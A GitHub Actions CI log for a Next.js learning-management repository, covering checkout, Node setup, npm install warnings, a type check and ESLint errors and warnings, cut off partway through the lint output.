2025-11-18T17:33:34.8885005Z Current runner version: '2.329.0'
2025-11-18T17:33:34.8908758Z ##[group]Runner Image Provisioner
2025-11-18T17:33:34.8909662Z Hosted Compute Agent
2025-11-18T17:33:34.8910225Z Version: 20251016.436
2025-11-18T17:33:34.8910850Z Commit: 8ab8ac8bfd662a3739dab9fe09456aba92132568
2025-11-18T17:33:34.8911589Z Build Date: 2025-10-15T20:44:12Z
2025-11-18T17:33:34.8912173Z ##[endgroup]
2025-11-18T17:33:34.8912741Z ##[group]Operating System
2025-11-18T17:33:34.8913264Z Ubuntu
2025-11-18T17:33:34.8913835Z 24.04.3
2025-11-18T17:33:34.8914286Z LTS
2025-11-18T17:33:34.8914747Z ##[endgroup]
2025-11-18T17:33:34.8915277Z ##[group]Runner Image
2025-11-18T17:33:34.8915858Z Image: ubuntu-24.04
2025-11-18T17:33:34.8916377Z Version: 20251112.124.1
2025-11-18T17:33:34.8917797Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20251112.124/images/ubuntu/Ubuntu2404-Readme.md
2025-11-18T17:33:34.8919372Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20251112.124
2025-11-18T17:33:34.8920408Z ##[endgroup]
2025-11-18T17:33:34.8921518Z ##[group]GITHUB_TOKEN Permissions
2025-11-18T17:33:34.8923625Z Contents: read
2025-11-18T17:33:34.8924177Z Metadata: read
2025-11-18T17:33:34.8924709Z Packages: read
2025-11-18T17:33:34.8925224Z ##[endgroup]
2025-11-18T17:33:34.8927836Z Secret source: Actions
2025-11-18T17:33:34.8928539Z Prepare workflow directory
2025-11-18T17:33:34.9883844Z Prepare all required actions
2025-11-18T17:33:34.9981711Z Getting action download info
2025-11-18T17:33:35.4554156Z Download action repository 'actions/checkout@v4' (SHA:08eba0b27e820071cde6df949e0beb9ba4906955)
2025-11-18T17:33:35.5640602Z Download action repository 'actions/setup-node@v4' (SHA:49933ea5288caeca8642d1e84afbd3f7d6820020)
2025-11-18T17:33:35.6624581Z Download action repository 'codecov/codecov-action@v3' (SHA:ab904c41d6ece82784817410c45d8b8c02684457)
2025-11-18T17:33:36.3803610Z Complete job name: Unit & Integration Tests (18)
2025-11-18T17:33:36.4399253Z ##[group]Run actions/checkout@v4
2025-11-18T17:33:36.4400111Z with:
2025-11-18T17:33:36.4400539Z   repository: brentcurtis76/fne-lms
2025-11-18T17:33:36.4401229Z   token: ***
2025-11-18T17:33:36.4401642Z   ssh-strict: true
2025-11-18T17:33:36.4402051Z   ssh-user: git
2025-11-18T17:33:36.4402455Z   persist-credentials: true
2025-11-18T17:33:36.4402912Z   clean: true
2025-11-18T17:33:36.4403337Z   sparse-checkout-cone-mode: true
2025-11-18T17:33:36.4403830Z   fetch-depth: 1
2025-11-18T17:33:36.4404231Z   fetch-tags: false
2025-11-18T17:33:36.4404649Z   show-progress: true
2025-11-18T17:33:36.4405063Z   lfs: false
2025-11-18T17:33:36.4405452Z   submodules: false
2025-11-18T17:33:36.4405865Z   set-safe-directory: true
2025-11-18T17:33:36.4406651Z env:
2025-11-18T17:33:36.4407291Z   NODE_VERSION: 18
2025-11-18T17:33:36.4407725Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:33:36.4408219Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:33:36.4408715Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:33:36.4409213Z ##[endgroup]
2025-11-18T17:33:36.5604625Z Syncing repository: brentcurtis76/fne-lms
2025-11-18T17:33:36.5607171Z ##[group]Getting Git version info
2025-11-18T17:33:36.5607911Z Working directory is '/home/runner/work/fne-lms/fne-lms'
2025-11-18T17:33:36.5610637Z [command]/usr/bin/git version
2025-11-18T17:33:36.5655518Z git version 2.51.2
2025-11-18T17:33:36.5686167Z ##[endgroup]
2025-11-18T17:33:36.5702726Z Temporarily overriding HOME='/home/runner/work/_temp/4cf06286-aa88-4a4e-a44a-81450694daa7' before making global git config changes
2025-11-18T17:33:36.5706498Z Adding repository directory to the temporary git global config as a safe directory
2025-11-18T17:33:36.5720531Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/fne-lms/fne-lms
2025-11-18T17:33:36.5759736Z Deleting the contents of '/home/runner/work/fne-lms/fne-lms'
2025-11-18T17:33:36.5768176Z ##[group]Initializing the repository
2025-11-18T17:33:36.5770770Z [command]/usr/bin/git init /home/runner/work/fne-lms/fne-lms
2025-11-18T17:33:36.5872186Z hint: Using 'master' as the name for the initial branch. This default branch name
2025-11-18T17:33:36.5875430Z hint: is subject to change. To configure the initial branch name to use in all
2025-11-18T17:33:36.5877222Z hint: of your new repositories, which will suppress this warning, call:
2025-11-18T17:33:36.5878321Z hint:
2025-11-18T17:33:36.5879062Z hint: 	git config --global init.defaultBranch <name>
2025-11-18T17:33:36.5880070Z hint:
2025-11-18T17:33:36.5881077Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
2025-11-18T17:33:36.5882685Z hint: 'development'. The just-created branch can be renamed via this command:
2025-11-18T17:33:36.5883960Z hint:
2025-11-18T17:33:36.5884652Z hint: 	git branch -m <name>
2025-11-18T17:33:36.5885474Z hint:
2025-11-18T17:33:36.5886499Z hint: Disable this message with "git config set advice.defaultBranchName false"
2025-11-18T17:33:36.5890934Z Initialized empty Git repository in /home/runner/work/fne-lms/fne-lms/.git/
2025-11-18T17:33:36.5895239Z [command]/usr/bin/git remote add origin https://github.com/brentcurtis76/fne-lms
2025-11-18T17:33:36.5933091Z ##[endgroup]
2025-11-18T17:33:36.5936597Z ##[group]Disabling automatic garbage collection
2025-11-18T17:33:36.5939730Z [command]/usr/bin/git config --local gc.auto 0
2025-11-18T17:33:36.5979174Z ##[endgroup]
2025-11-18T17:33:36.5980259Z ##[group]Setting up auth
2025-11-18T17:33:36.5981345Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
2025-11-18T17:33:36.6010906Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
2025-11-18T17:33:36.6342205Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
2025-11-18T17:33:36.6378308Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
2025-11-18T17:33:36.6611608Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
2025-11-18T17:33:36.6649927Z ##[endgroup]
2025-11-18T17:33:36.6654298Z ##[group]Fetching the repository
2025-11-18T17:33:36.6675010Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +89e92bc2573c6b6b808f69edc900daa4904a881d:refs/remotes/origin/main
2025-11-18T17:33:38.2730411Z From https://github.com/brentcurtis76/fne-lms
2025-11-18T17:33:38.2735129Z  * [new ref]         89e92bc2573c6b6b808f69edc900daa4904a881d -> origin/main
2025-11-18T17:33:38.2773563Z ##[endgroup]
2025-11-18T17:33:38.2775383Z ##[group]Determining the checkout info
2025-11-18T17:33:38.2777537Z ##[endgroup]
2025-11-18T17:33:38.2779348Z [command]/usr/bin/git sparse-checkout disable
2025-11-18T17:33:38.2821095Z [command]/usr/bin/git config --local --unset-all extensions.worktreeConfig
2025-11-18T17:33:38.2855125Z ##[group]Checking out the ref
2025-11-18T17:33:38.2857616Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
2025-11-18T17:33:38.4970692Z Switched to a new branch 'main'
2025-11-18T17:33:38.4974680Z branch 'main' set up to track 'origin/main'.
2025-11-18T17:33:38.4978681Z ##[endgroup]
2025-11-18T17:33:38.5031585Z [command]/usr/bin/git log -1 --format=%H
2025-11-18T17:33:38.5077842Z 89e92bc2573c6b6b808f69edc900daa4904a881d
2025-11-18T17:33:38.5303074Z ##[group]Run actions/setup-node@v4
2025-11-18T17:33:38.5303401Z with:
2025-11-18T17:33:38.5303609Z   node-version: 18
2025-11-18T17:33:38.5303826Z   cache: npm
2025-11-18T17:33:38.5304037Z   always-auth: false
2025-11-18T17:33:38.5304264Z   check-latest: false
2025-11-18T17:33:38.5304618Z   token: ***
2025-11-18T17:33:38.5304816Z env:
2025-11-18T17:33:38.5305008Z   NODE_VERSION: 18
2025-11-18T17:33:38.5305230Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:33:38.5305492Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:33:38.5305754Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:33:38.5306213Z ##[endgroup]
2025-11-18T17:33:38.7090017Z Attempting to download 18...
2025-11-18T17:33:39.4177848Z Acquiring 18.20.8 - x64 from https://github.com/actions/node-versions/releases/download/18.20.8-14110393767/node-18.20.8-linux-x64.tar.gz
2025-11-18T17:33:40.1185451Z Extracting ...
2025-11-18T17:33:40.1280800Z [command]/usr/bin/tar xz --strip 1 --warning=no-unknown-keyword --overwrite -C /home/runner/work/_temp/ac002b28-3147-4a88-906f-b2de6a0d3862 -f /home/runner/work/_temp/634a2da7-b6a1-45e7-98fc-1bb4daa0189d
2025-11-18T17:33:41.1952821Z Adding to the cache ...
2025-11-18T17:33:43.2768380Z ##[group]Environment details
2025-11-18T17:33:43.5656008Z node: v18.20.8
2025-11-18T17:33:43.5660283Z npm: 10.8.2
2025-11-18T17:33:43.5664158Z yarn: 1.22.22
2025-11-18T17:33:43.5668617Z ##[endgroup]
2025-11-18T17:33:43.5708059Z [command]/opt/hostedtoolcache/node/18.20.8/x64/bin/npm config get cache
2025-11-18T17:33:43.6925824Z /home/runner/.npm
2025-11-18T17:33:43.8822802Z Cache hit for: node-cache-Linux-x64-npm-342e9fcd0df6fe6c32eb4dc977eed286746e0e05bcbfd399a7686f110e209c81
2025-11-18T17:33:45.0997523Z Received 29360128 of 226642321 (13.0%), 28.0 MBs/sec
2025-11-18T17:33:46.0996099Z Received 138412032 of 226642321 (61.1%), 66.0 MBs/sec
2025-11-18T17:33:46.6869625Z Received 226642321 of 226642321 (100.0%), 83.5 MBs/sec
2025-11-18T17:33:46.6870843Z Cache Size: ~216 MB (226642321 B)
2025-11-18T17:33:46.7000068Z [command]/usr/bin/tar -xf /home/runner/work/_temp/3b9d62db-79c4-4b44-8549-c576df639005/cache.tzst -P -C /home/runner/work/fne-lms/fne-lms --use-compress-program unzstd
2025-11-18T17:33:47.3736702Z Cache restored successfully
2025-11-18T17:33:47.4168660Z Cache restored from key: node-cache-Linux-x64-npm-342e9fcd0df6fe6c32eb4dc977eed286746e0e05bcbfd399a7686f110e209c81
2025-11-18T17:33:47.4431050Z ##[group]Run npm ci
2025-11-18T17:33:47.4431348Z [36;1mnpm ci[0m
2025-11-18T17:33:47.4469437Z shell: /usr/bin/bash -e {0}
2025-11-18T17:33:47.4469685Z env:
2025-11-18T17:33:47.4469872Z   NODE_VERSION: 18
2025-11-18T17:33:47.4470082Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:33:47.4470313Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:33:47.4470553Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:33:47.4470768Z ##[endgroup]
2025-11-18T17:33:48.8234765Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8249490Z npm warn EBADENGINE   package: '@isaacs/balanced-match@4.0.1',
2025-11-18T17:33:48.8250270Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8251048Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8251637Z npm warn EBADENGINE }
2025-11-18T17:33:48.8262500Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8277586Z npm warn EBADENGINE   package: '@isaacs/brace-expansion@5.0.0',
2025-11-18T17:33:48.8278688Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8279713Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8282742Z npm warn EBADENGINE }
2025-11-18T17:33:48.8337410Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8338314Z npm warn EBADENGINE   package: 'glob@11.0.3',
2025-11-18T17:33:48.8341637Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8342419Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8343001Z npm warn EBADENGINE }
2025-11-18T17:33:48.8343472Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8344084Z npm warn EBADENGINE   package: 'minimatch@10.0.3',
2025-11-18T17:33:48.8344754Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8345511Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8346082Z npm warn EBADENGINE }
2025-11-18T17:33:48.8417541Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8418520Z npm warn EBADENGINE   package: 'jackspeak@4.1.1',
2025-11-18T17:33:48.8419581Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8420541Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8421682Z npm warn EBADENGINE }
2025-11-18T17:33:48.8467654Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8468597Z npm warn EBADENGINE   package: 'path-scurry@2.0.0',
2025-11-18T17:33:48.8469518Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8470443Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8471188Z npm warn EBADENGINE }
2025-11-18T17:33:48.8471813Z npm warn EBADENGINE Unsupported engine {
2025-11-18T17:33:48.8472576Z npm warn EBADENGINE   package: 'lru-cache@11.2.2',
2025-11-18T17:33:48.8473398Z npm warn EBADENGINE   required: { node: '20 || >=22' },
2025-11-18T17:33:48.8474321Z npm warn EBADENGINE   current: { node: 'v18.20.8', npm: '10.8.2' }
2025-11-18T17:33:48.8475052Z npm warn EBADENGINE }
2025-11-18T17:33:57.1278534Z npm warn deprecated inflight@1.0.6: This module is not supported, and leaks memory. Do not use it. Check out lru-cache if you want a good and tested way to coalesce async requests by a key value, which is much more comprehensive and powerful.
2025-11-18T17:33:57.2187172Z npm warn deprecated npmlog@5.0.1: This package is no longer supported.
2025-11-18T17:33:57.4462936Z npm warn deprecated @humanwhocodes/config-array@0.11.14: Use @eslint/config-array instead
2025-11-18T17:33:57.4686598Z npm warn deprecated rimraf@3.0.2: Rimraf versions prior to v4 are no longer supported
2025-11-18T17:33:57.4954819Z npm warn deprecated abab@2.0.6: Use your platform's native atob() and btoa() methods instead
2025-11-18T17:33:57.6166023Z npm warn deprecated are-we-there-yet@2.0.0: This package is no longer supported.
2025-11-18T17:33:57.6805210Z npm warn deprecated @humanwhocodes/object-schema@2.0.3: Use @eslint/object-schema instead
2025-11-18T17:33:57.6831387Z npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.6841503Z npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.6864516Z npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.6897113Z npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.6898194Z npm warn deprecated glob@8.1.0: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.6907844Z npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
2025-11-18T17:33:57.7935990Z npm warn deprecated domexception@4.0.0: Use your platform's native DOMException instead
2025-11-18T17:33:57.8058560Z npm warn deprecated @supabase/auth-helpers-shared@0.7.0: This package is now deprecated - please use the @supabase/ssr package instead.
2025-11-18T17:33:57.9488979Z npm warn deprecated @supabase/auth-helpers-react@0.5.0: This package is now deprecated - please use the @supabase/ssr package instead.
2025-11-18T17:33:58.1176122Z npm warn deprecated gauge@3.0.2: This package is no longer supported.
2025-11-18T17:33:58.3321386Z npm warn deprecated @supabase/auth-helpers-nextjs@0.10.0: This package is now deprecated - please use the @supabase/ssr package instead.
2025-11-18T17:34:01.3448121Z npm warn deprecated react-beautiful-dnd@13.1.1: react-beautiful-dnd is now deprecated. Context and options: https://github.com/atlassian/react-beautiful-dnd/issues/2672
2025-11-18T17:34:02.7047430Z npm warn deprecated eslint@8.57.0: This version is no longer supported. Please see https://eslint.org/version-support for other options.
2025-11-18T17:34:16.8562098Z 
2025-11-18T17:34:16.8563406Z added 1293 packages, and audited 1294 packages in 29s
2025-11-18T17:34:16.8565312Z 
2025-11-18T17:34:16.8565769Z 264 packages are looking for funding
2025-11-18T17:34:16.8566615Z   run `npm fund` for details
2025-11-18T17:34:16.9613193Z 
2025-11-18T17:34:16.9617995Z 13 vulnerabilities (5 moderate, 8 high)
2025-11-18T17:34:16.9622080Z 
2025-11-18T17:34:16.9626235Z To address issues that do not require attention, run:
2025-11-18T17:34:16.9628867Z   npm audit fix
2025-11-18T17:34:16.9631576Z 
2025-11-18T17:34:16.9633266Z To address all issues possible (including breaking changes), run:
2025-11-18T17:34:16.9635141Z   npm audit fix --force
2025-11-18T17:34:16.9639401Z 
2025-11-18T17:34:16.9643139Z Some issues need review, and may require choosing
2025-11-18T17:34:16.9647458Z a different dependency.
2025-11-18T17:34:16.9651256Z 
2025-11-18T17:34:16.9655166Z Run `npm audit` for details.
2025-11-18T17:34:17.0750891Z ##[group]Run npm run type-check
2025-11-18T17:34:17.0751352Z [36;1mnpm run type-check[0m
2025-11-18T17:34:17.0787792Z shell: /usr/bin/bash -e {0}
2025-11-18T17:34:17.0788078Z env:
2025-11-18T17:34:17.0788308Z   NODE_VERSION: 18
2025-11-18T17:34:17.0788562Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:34:17.0788812Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:34:17.0789093Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:34:17.0789355Z ##[endgroup]
2025-11-18T17:34:17.2108905Z 
2025-11-18T17:34:17.2110170Z > fne-lms-v2@1.0.1 type-check
2025-11-18T17:34:17.2110699Z > tsc --noEmit
2025-11-18T17:34:17.2111439Z 
2025-11-18T17:34:55.2880030Z ##[group]Run npm run lint || true
2025-11-18T17:34:55.2880327Z [36;1mnpm run lint || true[0m
2025-11-18T17:34:55.2914362Z shell: /usr/bin/bash -e {0}
2025-11-18T17:34:55.2914596Z env:
2025-11-18T17:34:55.2914758Z   NODE_VERSION: 18
2025-11-18T17:34:55.2914945Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:34:55.2915182Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:34:55.2915418Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:34:55.2915623Z ##[endgroup]
2025-11-18T17:34:55.4224779Z 
2025-11-18T17:34:55.4228736Z > fne-lms-v2@1.0.1 lint
2025-11-18T17:34:55.4230081Z > eslint --ext .js,.jsx,.ts,.tsx --max-warnings=0 .
2025-11-18T17:34:55.4231515Z 
2025-11-18T17:35:22.1571555Z 
2025-11-18T17:35:22.1572304Z /home/runner/work/fne-lms/fne-lms/__tests__/utils/test-utils.tsx
2025-11-18T17:35:22.1608563Z ##[warning]  176:1  warning  Assign object to a variable before exporting as module default  import/no-anonymous-default-export
2025-11-18T17:35:22.1618746Z 
2025-11-18T17:35:22.1619301Z /home/runner/work/fne-lms/fne-lms/components/ArticleContent.tsx
2025-11-18T17:35:22.1623287Z ##[warning]  17:11  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1625618Z 
2025-11-18T17:35:22.1626122Z /home/runner/work/fne-lms/fne-lms/components/AssignTeachersModal.tsx
2025-11-18T17:35:22.1628881Z ##[warning]  39:6  warning  React Hook useEffect has missing dependencies: 'fetchAssignedTeachers' and 'fetchTeachers'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1630661Z 
2025-11-18T17:35:22.1631108Z /home/runner/work/fne-lms/fne-lms/components/BlockTutorial.tsx
2025-11-18T17:35:22.1633096Z ##[warning]  214:11  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images  jsx-a11y/alt-text
2025-11-18T17:35:22.1634612Z 
2025-11-18T17:35:22.1635143Z /home/runner/work/fne-lms/fne-lms/components/ConsultantAssignmentModal.tsx
2025-11-18T17:35:22.1637869Z ##[warning]  86:6  warning  React Hook useEffect has missing dependencies: 'fetchData' and 'populateFormForEditing'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1639707Z 
2025-11-18T17:35:22.1640171Z /home/runner/work/fne-lms/fne-lms/components/DeleteCourseModal.tsx
2025-11-18T17:35:22.1642400Z ##[error]  31:58   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1644692Z ##[error]  31:107  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1647313Z ##[error]  39:37   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1649938Z ##[error]  39:94   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1651199Z 
2025-11-18T17:35:22.1651663Z /home/runner/work/fne-lms/fne-lms/components/DeleteLessonModal.tsx
2025-11-18T17:35:22.1652994Z ##[error]  49:67  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1655118Z ##[error]  49:81  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1656451Z 
2025-11-18T17:35:22.1657145Z /home/runner/work/fne-lms/fne-lms/components/DeleteModuleModal.tsx
2025-11-18T17:35:22.1658518Z ##[error]  49:66  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1660673Z ##[error]  49:80  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1661910Z 
2025-11-18T17:35:22.1662619Z /home/runner/work/fne-lms/fne-lms/components/Footer.tsx
2025-11-18T17:35:22.1668598Z ##[warning]  32:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1671009Z 
2025-11-18T17:35:22.1671470Z /home/runner/work/fne-lms/fne-lms/components/LessonBreadcrumb.tsx
2025-11-18T17:35:22.1673491Z ##[warning]  93:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1675120Z 
2025-11-18T17:35:22.1675596Z /home/runner/work/fne-lms/fne-lms/components/LessonTimeline.tsx
2025-11-18T17:35:22.1677703Z ##[warning]  49:16  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images  jsx-a11y/alt-text
2025-11-18T17:35:22.1679425Z 
2025-11-18T17:35:22.1679913Z /home/runner/work/fne-lms/fne-lms/components/MoveLessonModal.tsx
2025-11-18T17:35:22.1682286Z ##[warning]  41:6   warning  React Hook useEffect has a missing dependency: 'fetchAvailableModules'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1685439Z ##[error]  98:38  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                           react/no-unescaped-entities
2025-11-18T17:35:22.1688325Z ##[error]  98:52  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                           react/no-unescaped-entities
2025-11-18T17:35:22.1689741Z 
2025-11-18T17:35:22.1690146Z /home/runner/work/fne-lms/fne-lms/components/NewsSlider.tsx
2025-11-18T17:35:22.1693702Z ##[warning]  171:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1696276Z 
2025-11-18T17:35:22.1697340Z /home/runner/work/fne-lms/fne-lms/components/PrivacyPolicyModal.tsx
2025-11-18T17:35:22.1698783Z ##[error]  118:203  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1701185Z ##[error]  118:224  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1702558Z 
2025-11-18T17:35:22.1703030Z /home/runner/work/fne-lms/fne-lms/components/RegistrationModal.tsx
2025-11-18T17:35:22.1705351Z ##[warning]  54:6  warning  React Hook useEffect has missing dependencies: 'fetchSchools' and 'schools.length'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1707373Z 
2025-11-18T17:35:22.1708112Z /home/runner/work/fne-lms/fne-lms/components/RoleAssignmentModal.tsx
2025-11-18T17:35:22.1710112Z ##[warning]   93:6  warning  React Hook useEffect has a missing dependency: 'loadData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1713301Z ##[warning]  114:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1715064Z 
2025-11-18T17:35:22.1715504Z /home/runner/work/fne-lms/fne-lms/components/TeamMemberImage.tsx
2025-11-18T17:35:22.1719213Z ##[warning]  63:9  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1724932Z ##[warning]  87:7  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1727591Z 
2025-11-18T17:35:22.1728033Z /home/runner/work/fne-lms/fne-lms/components/TermsOfUseModal.tsx
2025-11-18T17:35:22.1729355Z ##[error]  108:47  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1731541Z ##[error]  108:61  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1732868Z 
2025-11-18T17:35:22.1733480Z /home/runner/work/fne-lms/fne-lms/components/__tests__/GroupAssignmentsContent.test.tsx
2025-11-18T17:35:22.1735887Z ##[warning]   52:10  warning  React Hook useEffect has a missing dependency: 'loadGroupAssignments'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1739611Z ##[error]  242:3   error    Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable                  @next/next/no-assign-module-variable
2025-11-18T17:35:22.1741368Z 
2025-11-18T17:35:22.1741848Z /home/runner/work/fne-lms/fne-lms/components/activity/ActivityFeed.tsx
2025-11-18T17:35:22.1744399Z ##[warning]  130:6  warning  React Hook useCallback has missing dependencies: 'activeFilters', 'currentUserId', and 'offset'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1748346Z ##[warning]  144:6  warning  React Hook useEffect has a missing dependency: 'loadActivities'. Either include it or remove the dependency array                                    react-hooks/exhaustive-deps
2025-11-18T17:35:22.1752111Z ##[warning]  144:7  warning  React Hook useEffect has a complex expression in the dependency array. Extract it to a separate variable so it can be statically checked             react-hooks/exhaustive-deps
2025-11-18T17:35:22.1753968Z 
2025-11-18T17:35:22.1754475Z /home/runner/work/fne-lms/fne-lms/components/activity/ActivityFilters.tsx
2025-11-18T17:35:22.1758264Z ##[warning]  60:6  warning  React Hook useEffect has missing dependencies: 'filters' and 'onFiltersChange'. Either include them or remove the dependency array. If 'onFiltersChange' changes too often, find the parent component that defines it and wrap that definition in useCallback  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1760661Z 
2025-11-18T17:35:22.1761239Z /home/runner/work/fne-lms/fne-lms/components/admin/FeedbackPermissionsManager.tsx
2025-11-18T17:35:22.1763422Z ##[warning]  31:6  warning  React Hook useEffect has a missing dependency: 'loadUsers'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1765046Z 
2025-11-18T17:35:22.1765536Z /home/runner/work/fne-lms/fne-lms/components/assignments/AssignmentForm.tsx
2025-11-18T17:35:22.1767721Z ##[warning]  44:6  warning  React Hook useEffect has a missing dependency: 'fetchCourses'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
